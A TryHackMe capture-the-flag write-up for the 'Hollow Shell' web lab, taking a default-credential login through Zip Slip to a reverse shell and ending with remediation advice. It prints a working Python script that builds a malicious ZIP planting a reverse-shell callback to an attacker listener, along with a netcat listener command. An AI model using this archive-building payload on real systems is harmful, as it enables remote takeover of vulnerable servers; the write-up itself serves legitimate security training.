# TryHackMe – The Hollow Shell

> Practical walkthrough of an authorised TryHackMe lab.

## Lab information

* **Event:** Hacker Holidays 2026
* **Category:** Web
* **Difficulty:** Medium
* **Completed:** 7 August 2026

## Objective

The objective was to compromise the Byte Lotus Shoreline Display portal and recover the flag.

## Reconnaissance

An initial Nmap scan identified two open ports:

```text
22/tcp    OpenSSH
5000/tcp  Gunicorn web application
```

The web application was hosted on port 5000 and redirected unauthenticated requests to `/login`.

```bash
nmap -sV -Pn -sC <TARGET_IP>
```

## Exposed credentials

Reviewing the source of the login page revealed default staff credentials embedded in an HTML comment.

<img width="722" height="681" alt="Default credentials exposed in the page source" src="https://github.com/user-attachments/assets/ae9cf826-d706-43a3-b59f-4adfc352d455" />

The credentials provided access to the internal Shoreline Display portal.

## Shell upload functionality

The authenticated portal allowed staff to upload ZIP archives described as “shells”. Each archive was required to contain a `shell.json` manifest.

The page also mentioned optional automation hooks processed by a theme worker.


<img width="1086" height="1056" alt="Shell upload interface" src="https://github.com/user-attachments/assets/4dddedbe-dbaa-42a8-85a0-870d51cf5fc6" />


A minimal test archive containing the following manifest was initially rejected because it lacked a name:

```json
{}
```

Adding the required field produced a valid shell:

```json
{
  "name": "Beach Test"
}
```

The application extracted the archive into a randomly generated directory and exposed its contents through the web application:

```text
/shells/<generated-id>/shell.json
```

## Failed assumptions and iteration

My initial hypothesis was that the `shell.json` manifest accepted commands through its automation-hook functionality.

I tested several possible structures, including a list of hooks and an object containing a `post_install` hook. I also used a controlled HTTP callback to an AttackBox listener to determine whether any command was executed.

Although the application stored the supplied hook values, no callback was received. A manual request confirmed that the listener itself was functioning correctly. This indicated that either the assumed hook structure was incorrect or the worker did not execute hooks directly from the manifest.

Rather than continuing to guess the undocumented manifest format, I reconsidered the challenge wording and the way the ZIP archives were extracted. The repeated references to placing something “inside” a shell suggested testing for Zip Slip.

## Confirming Zip Slip

I created a harmless proof-of-concept archive containing a traversal path:

```python
import json
import zipfile

manifest = {
    "name": "zipslip-proof",
    "assets": []
}

with zipfile.ZipFile("zipslip-proof.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(
        "../../static/zipslip-proof.css",
        "ZIP_SLIP_CONFIRMED\n"
    )
```

Listing the archive confirmed that it contained the traversal path:

```text
shell.json
../../static/zipslip-proof.css
```

After uploading the archive, the proof file was accessible from the application's global static directory:

```bash
curl http://<TARGET_IP>:5000/static/zipslip-proof.css
```

The server returned:

```text
ZIP_SLIP_CONFIRMED
```

This demonstrated that the application extracted ZIP entries without safely resolving and validating their destination paths. An archive member could therefore escape the intended shell directory and write elsewhere within the application structure.

## From arbitrary file write to command execution

An initial attempt to place an SSH public key in the root user's `authorized_keys` file failed. This suggested that the application could not write to `/root`, that the target directory was unavailable, or that the SSH configuration did not accept the injected key.

The portal indicated that automation hooks were processed by a theme worker. Based on this behaviour, I tested whether the confirmed Zip Slip vulnerability could place a Python callback in an application-relative `hooks` directory.

The following script generated the malicious archive:

```python
import json
import zipfile

LHOST = "<ATTACKBOX_IP>"
LPORT = 4444

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f"""
import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
"""

with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../hooks/callback.py", callback)

print("Created reverse-shell.zip")
```

Before uploading the archive, I started a Netcat listener:

```bash
nc -lvnp 4444
```

The theme worker processed `callback.py`, resulting in an incoming reverse shell:

```text
Connection received on <TARGET_IP>
uid=996(roomservice) gid=996(roomservice) groups=996(roomservice)
```


<img width="1085" height="1033" alt="Reverse shell obtained as the roomservice user" src="https://github.com/user-attachments/assets/07a1c96e-4036-40cd-af1a-e67b798951ed" />



The shell opened in:

```text
/var/www/conch
```

The application directory contained both the writable `hooks` directory and `theme_worker.py`, confirming how the callback was reached and executed.

## Flag retrieval

The flag was located by searching the application, home and optional software directories:

```bash
find /var/www/conch /home /opt -type f \
  \( -iname "flag.txt" -o -iname "*flag*" \) 2>/dev/null
```

This identified:

```text
/home/roomservice/flag.txt
```

The flag was then read and submitted to TryHackMe.

```text
THM{XXXX_XXXX_XXXXXX}
```


<img width="1261" height="509" alt="Flag" src="https://github.com/user-attachments/assets/f9cfc19c-88fb-4782-b333-cc540845b00b" />


## Attack chain

```text
Service enumeration
→ credentials exposed in HTML source
→ authenticated ZIP upload
→ Zip Slip arbitrary file write
→ Python callback written to the worker's hooks directory
→ reverse shell as roomservice
→ flag retrieval
```

## Remediation

The application should:

* Never expose credentials in client-side source code.
* Require users to replace default credentials before use.
* Resolve and validate every archive member against the intended extraction directory.
* Reject absolute paths and entries containing traversal components such as `../`.
* Process uploaded content outside the application directory.
* Avoid automatically executing files from writable directories.
* Run the application and background worker with minimal filesystem permissions.

> All testing documented here was performed within an authorised TryHackMe training environment.
